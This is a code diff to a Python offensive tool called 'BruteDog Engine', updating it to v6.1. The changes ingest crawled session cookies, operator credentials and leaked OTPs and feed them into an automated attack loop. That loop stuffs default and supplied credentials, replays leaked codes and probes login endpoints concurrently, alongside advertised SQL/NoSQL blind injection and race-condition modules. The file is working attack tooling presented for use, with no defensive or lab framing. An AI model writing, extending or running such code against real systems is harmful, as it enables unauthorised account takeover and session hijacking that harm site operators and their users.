@@ -1,8 +1,9 @@
 #!/usr/bin/env python3
 """
-BRUTEDOG ENGINE v5.6 — High-Aggression Dynamic Crawling & Exploitation Engine
+BRUTEDOG ENGINE v6.1 — High-Aggression Stateful Crawling & Exploitation Engine
 Features:
-- Dynamic web crawling & API route discovery via crawler module
+- Stateful intelligence ingestion from v6.1 crawler (endpoints, session cookies, leaked OTPs)
+- Live autonomous test-account session propagation across exploit modules
 - Interactive target selection & automated resolution
 - Stateful, adaptive response-parsing and payload mutation loop
 - Aggressive NoSQL/SQL time-based blind injection & data extraction
@@ -36,7 +37,7 @@ from modules.race_condition import run_race_condition_test
 REQUEST_TIMEOUT = 8
 MAX_WORKERS = 5
 MAX_RESPONSE_SIZE = 200_000
-USER_AGENT = "BruteDog-Offensive-Engine/5.6"
+USER_AGENT = "BruteDog-Offensive-Engine/6.1"
 
 FALLBACK_LOGIN_PATHS = [
     "/api/auth/callback/credentials",
@@ -124,7 +125,7 @@ def resolve_target(host):
 # ============================================================
 # HTTP TRANSPORT
 # ============================================================
-def request(host, port, path, payload, secure):
+def request(host, port, path, payload, secure, cookies=None):
     conn = None
     started = time.monotonic()
     try:
@@ -143,6 +144,9 @@ def request(host, port, path, payload, secure):
             "Accept": "application/json, text/plain, */*",
             "Connection": "close",
         }
+        if cookies:
+            headers["Cookie"] = cookies
+
         conn.request("POST", path, body=body, headers=headers)
         response = conn.getresponse()
         response_body = response.read(MAX_RESPONSE_SIZE).decode("utf-8", errors="replace")
@@ -233,9 +237,9 @@ def classify_and_adapt(response, current_payload):
 # ============================================================
 # ACTIVE ADAPTIVE ENDPOINT TESTING
 # ============================================================
-def test_endpoint(host, port, base_path, path, secure, credentials_list=None):
+def test_endpoint(host, port, base_path, path, secure, session_cookie=None, credentials_list=None, leaked_secrets=None):
     endpoint = f"{base_path}{path}" if not path.startswith(base_path) else path
-    info(f"Targeting endpoint (Adaptive Mode): {endpoint}")
+    info(f"Targeting endpoint (Stateful Adaptive Mode): {endpoint}")
     results = []
     
     test_queue = [
@@ -244,6 +248,11 @@ def test_endpoint(host, port, base_path, path, secure, credentials_list=None):
         {"name": "Admin Default Stuffing", "payload": {"username": "admin", "password": "password123"}},
         {"name": "Malformed Type Probe", "payload": {"username": {"unexpected": "object"}, "password": "password"}}
     ]
+
+    # If the crawler leaked an OTP or verification code, inject a test case for it
+    if leaked_secrets:
+        for k, v in leaked_secrets.items():
+            test_queue.insert(0, {"name": f"Leaked Secret Replay ({k})", "payload": {k: v, "code": v}})
 
     if credentials_list and isinstance(credentials_list, list):
         for cred in credentials_list:
@@ -259,7 +268,7 @@ def test_endpoint(host, port, base_path, path, secure, credentials_list=None):
             continue
         executed_payloads.add(payload_key)
 
-        result = request(host, port, endpoint, current_test["payload"], secure)
+        result = request(host, port, endpoint, current_test["payload"], secure, cookies=session_cookie)
         if result["error"]:
             continue
             
@@ -285,7 +294,7 @@ def test_endpoint(host, port, base_path, path, secure, credentials_list=None):
 # ENGINE ORCHESTRATOR
 # ============================================================
 async def run_autonomous_engine(target_host=None, credentials_list=None, options=None):
-    section("BRUTEDOG ADAPTIVE OFFENSIVE EXPLOITATION ENGINE v5.6")
+    section("BRUTEDOG STATEFUL OFFENSIVE EXPLOITATION ENGINE v6.1")
     try:
         if target_host:
             target = target_host.strip()
@@ -320,16 +329,32 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     start = time.monotonic()
     target_url = f"{protocol.lower()}://{host}:{port}{base_path}"
     
-    # 0. Dynamic Web Crawling & Route Discovery
-    section("DYNAMIC ENDPOINT CRAWLING & RECON")
+    # 0. Stateful Dynamic Web Crawling & Auto-Provisioning
+    section("STATEFUL CRAWLING & OPERATOR PROVISIONING")
+    session_cookie = ""
+    operator_creds = {}
+    leaked_secrets = {}
+    discovered_paths = []
+
     try:
-        discovered_paths = crawl_target(target_url)
+        recon_data = crawl_target(target_url)
+        if isinstance(recon_data, dict):
+            discovered_paths = recon_data.get("endpoints", [])
+            session_cookie = recon_data.get("session_cookie", "")
+            operator_creds = recon_data.get("operator_credentials", {})
+            leaked_secrets = recon_data.get("leaked_secrets", {})
+        elif isinstance(recon_data, list):
+            discovered_paths = recon_data
     except Exception as exc:
-        warning(f"Crawler encountered an issue: {exc}. Falling back to default list.")
-        discovered_paths = []
+        warning(f"Stateful crawler encountered an issue: {exc}. Falling back to default list.")
 
     if not discovered_paths:
         discovered_paths = FALLBACK_LOGIN_PATHS
+
+    if session_cookie:
+        success(f"Propagating active operator session cookie into exploit modules.")
+    if leaked_secrets:
+        warning(f"Discovered potential leaked JSON codes/tokens: {leaked_secrets}")
 
     section("ADAPTIVE ENDPOINT TESTING & MUTATION ASSAULT")
     all_results = []
@@ -338,7 +363,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     async def worker(path):
         async with semaphore:
             return await asyncio.to_thread(
-                test_endpoint, host, port, base_path, path, secure, credentials_list
+                test_endpoint, host, port, base_path, path, secure, session_cookie, credentials_list, leaked_secrets
             )
             
     tasks = [asyncio.create_task(worker(path)) for path in discovered_paths]
